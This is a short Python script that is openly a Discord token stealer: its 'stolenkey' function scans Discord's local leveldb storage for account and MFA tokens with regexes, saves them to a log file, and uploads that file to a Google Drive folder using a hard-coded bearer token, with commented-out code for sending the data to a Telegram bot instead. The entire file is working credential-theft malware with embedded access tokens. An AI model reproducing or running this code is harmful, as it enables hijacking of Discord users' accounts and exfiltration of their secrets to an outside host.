from os import listdir #, remove
from re import findall
# from time import sleep
from requests import post
from json import dumps
from platform import uname
from datetime import datetime

esm_sys = uname()
esm = datetime.now()
esm_v2 = esm.strftime("_%Y-%m-%d_%H-%M-%S")
esm_fin = "User " + esm_sys[1] + esm_v2
headers = {"Authorization": "Bearer ya29.A0ARrdaM8OIDeVMyfNXZxkGUkIfFDP1O-DSrJxNVcvHeTCBnvsvDS6G1DQ7ZoDtfvxHQKzysHIijosdg55J3SmC7I2jlQtYtQda9W8coL4q5_NskUnTwwZ2aky6wOt9cR4kLJAGsPffShYT7I9UzbHvUtOm62u"}
para = {
        "name": esm_fin,
        "parents" : ["16sn0jHLsd_mP0Jji9iYY-XOVXD0X0Kqe"]
        }
# print('Step 1')
def stolenkey():
    try:
        loc = "C:\\Users\\nabati\\AppData\\Roaming\\Discord\\Local Storage\\leveldb"
        tokens = []
        for fileName in listdir(loc):
            if fileName.endswith(".log") or fileName.endswith(".ldb"):
                readfile = open(f"{loc}//{fileName}", errors="ignore").readlines()
                for line in readfile:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
        with open("userlog.txt", "a") as keytokenfile:
            for token in tokens:
                keytokenfile.write(token)

        print(token)
            # print('Step 2')
    # msg = open("./userlog.txt", "rb")
    # strmess = str(msg)
    # print(strmess)
    # url = ("https://api.telegram.org/bot2041127230:AAGZLT6wEKbLGSBf_VGz__N1lmELKPbXEAY/SendMessage?chat_id=1127035778&text=" + strmess)
    # payload = {"UrlBox":url,
    #                "AgentList":"Mozilla Firefox",
    #                "VersionsList":"HTTP/1.1",
    #                "MethodList":"POST"
    #                }
    # req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", payload)
    # print(req)
        files = {
                'data': ('metadata', dumps(para), 'application/json; charset=UTF-8'),
            'file': open("./userlog.txt", "rb")
            }
        r = post(
            "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
            headers=headers,
            files=files
            )
    # print(r.status_code)
    # print('Step 3')
        # print(r.text)
    # sleep(10)
    # remove("./userlog.txt")
    except:
        pass
stolenkey()
